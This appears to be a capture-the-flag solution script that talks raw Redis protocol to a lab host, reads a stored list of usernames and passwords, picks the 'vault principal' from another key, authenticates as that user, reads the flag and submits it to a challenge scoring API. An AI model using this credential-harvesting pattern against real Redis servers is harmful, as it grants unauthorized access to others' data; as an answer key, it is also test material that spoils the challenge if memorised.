#!/bin/sh
set -eu

flag=$(python3 - <<'PY'
import socket

HOST = "172.20.0.147"
PORT = 6379

def encode(*parts):
    out = f"*{len(parts)}\r\n".encode()
    for part in parts:
        b = str(part).encode()
        out += f"${len(b)}\r\n".encode() + b + b"\r\n"
    return out

def read_resp(sock):
    line = b""
    while not line.endswith(b"\r\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("connection closed")
        line += chunk
    prefix, data = line[:1], line[1:-2]
    if prefix == b"+":
        return data.decode()
    if prefix == b"-":
        raise RuntimeError(data.decode())
    if prefix == b"$":
        n = int(data)
        if n < 0:
            return None
        buf = b""
        while len(buf) < n + 2:
            chunk = sock.recv(n + 2 - len(buf))
            if not chunk:
                raise RuntimeError("connection closed")
            buf += chunk
        return buf[:n].decode()
    if prefix == b"*":
        n = int(data)
        return [read_resp(sock) for _ in range(n)]
    raise RuntimeError("unexpected Redis response")

def command(sock, *parts):
    sock.sendall(encode(*parts))
    return read_resp(sock)

with socket.create_connection((HOST, PORT), timeout=5) as s:
    entries = command(s, "GET", "brief:entries")
    archive = command(s, "GET", "brief:archive")
    candidates = {}
    for item in entries.split("|"):
        name, password = item.strip().split(" / ", 1)
        candidates[name] = password
    principal = archive.split("active vault principal = ", 1)[1].split(".", 1)[0]
    password = candidates[principal]
    if command(s, "AUTH", principal, password) != "OK":
        raise RuntimeError("authentication failed")
    flag = command(s, "GET", "vault:record")
    print(flag)
PY
)
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"scl-challenge-frame-837923\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
